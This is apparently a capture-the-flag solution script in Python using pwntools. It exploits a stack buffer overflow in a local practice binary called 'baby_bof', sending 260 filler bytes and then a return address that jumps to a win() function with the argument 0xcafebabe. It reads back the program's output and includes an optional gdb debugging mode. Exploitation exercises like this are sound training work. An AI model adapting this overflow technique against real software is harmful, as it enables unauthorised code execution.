from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./baby_bof"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x08048638
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 260
payload += p32(0x080485f6)    # win()
payload += p32(0xBBBBBBBB)    # padding
payload += p32(0xcafebabe)

p.recvuntil("Enter your name: ")
p.sendline(payload)
sleep(1)
p.recvuntil("Here it comes: ")
print(p.recv(256))

#p.interactive()
